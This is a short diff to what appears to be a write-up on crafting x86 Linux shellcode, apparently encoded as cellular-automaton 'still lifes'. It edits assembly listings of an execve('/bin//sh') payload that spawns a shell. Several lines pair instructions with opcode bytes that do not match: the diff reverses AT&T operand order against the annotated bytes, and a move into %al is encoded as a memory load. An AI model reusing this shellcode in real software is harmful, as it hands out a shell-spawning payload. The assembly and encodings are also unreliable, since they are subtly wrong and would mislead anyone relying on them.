@@ -71,11 +71,11 @@ xor    %eax,%eax        ; "\x31\xC0"
 push   %eax             ; "\x50"
 push   $0x68732f2f      ; "\x68\x2F\x2F\x73\x68"
 push   $0x6e69622f      ; "\x68\x2F\x62\x69\x6E"
-mov    %esp,%ebx        ; "\x89\xDC"
+mov    %ebx,%esp        ; "\x89\xE3"
 mov    %dl, 0x0         ; "\xB2\x00" 
 push   %eax             ; "\x50"
 push   %ebx             ; "\x53"
-mov    %esp,%ecx        ; "\x89\xCC"
+mov    %ecx, %esp       ; "\x89\xE1"
 mov    %al, $0xb        ; "\xA0\x00\x00\x00\x00"
 int    $0x80            ; "\xCD\x80"     
 ```
@@ -132,11 +132,11 @@ inc    %ebx             ; "\x43"
 mov    %dl, 0x0         ; "\xB2\x00" 
 push   %eax             ; "\x50"
 push   %ebx             ; "\x53"
-mov    %esp,%ecx        ; "\x89\xCC"
+mov    %ecx, %esp       ; "\x89\xE1"
 mov    %al, $0xb        ; "\xA0\x00\x00\x00\x00"
 int    $0x80            ; "\xCD\x80"   
 ```
-I then replace `mov %al, $0xb` with `or %al, $0xb` to eliminate 3 bytes. Unfortunately, I was unable to find a still life construction for `mov %esp, %ecx`. So I had to replace these instructions with
+I then replace `mov %al, $0xb` with `or %al, $0xb` to eliminate 3 bytes. Unfortunately, I was unable to find a still life construction for `mov %ecx, %esp`. So I had to replace these instructions with
 ```assembly
 push esp
 pop  ecx
